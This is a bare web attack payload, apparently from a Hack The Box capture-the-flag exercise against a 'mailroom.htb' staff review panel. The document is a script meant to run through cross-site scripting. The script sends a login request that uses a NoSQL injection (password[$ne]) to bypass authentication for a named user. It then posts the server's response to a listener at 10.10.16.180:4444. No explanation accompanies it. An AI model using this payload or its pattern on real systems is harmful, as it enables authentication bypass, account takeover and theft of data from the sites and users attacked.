http://staff-review-panel.mailroom.htb/auth.php?token=

<





<script>
x=new XMLHttpRequest;
x.onload=function(){
fetch("http://10.10.16.180:4444/",{
method:"POST",
headers:{"Content-Type":"application/x-www-form-urlencoded"},
body:"r="+encodeURIComponent(this.responseText)
})
};
x.open("POST","http://staff-review-panel.mailroom.htb/auth.php");
x.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
x.send("email=tristan@mailroom.htb&password[$ne]=password");
</script>